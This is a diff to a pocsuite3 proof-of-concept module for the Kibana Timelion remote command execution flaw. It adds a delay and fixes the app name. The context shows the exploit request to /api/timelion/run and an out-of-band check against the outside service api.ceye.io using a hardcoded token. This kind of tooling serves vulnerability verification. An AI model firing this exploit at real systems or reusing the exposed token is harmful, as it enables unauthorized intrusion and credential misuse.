@@ -7,6 +7,7 @@ from pocsuite3.api import register_poc
 from pocsuite3.api import requests
 from pocsuite3.api import logger
 from pocsuite3.lib.utils import random_str
+from time import sleep
 
 class Kibana(POCBase):
     vulID = '98089'
@@ -18,7 +19,7 @@ class Kibana(POCBase):
     references = ['https://www.seebug.org/vuldb/ssvid-98089']
     name = 'Kibana < 6.6.0 Timelion function remote command execution vulnerability'
     appPowerLink = 'http://www.elasticsearch.cn/'
-    appName = 'elasticsearch'
+    appName = 'kibana'
     appVersion = '< 6.6.0'
     vulType = 'rce'
     desc = '''
@@ -55,6 +56,7 @@ class Kibana(POCBase):
             else:
                 url = self.url + '/api/timelion/run'
             requests.post(url, headers=headers, data=payload)
+            sleep(2)
             res = requests.get('http://api.ceye.io/v1/records?token=2490ae17e5a04f03def427a596438995&type=dns')
             if cmd in res:
                 result['VerifyInfo'] = {}
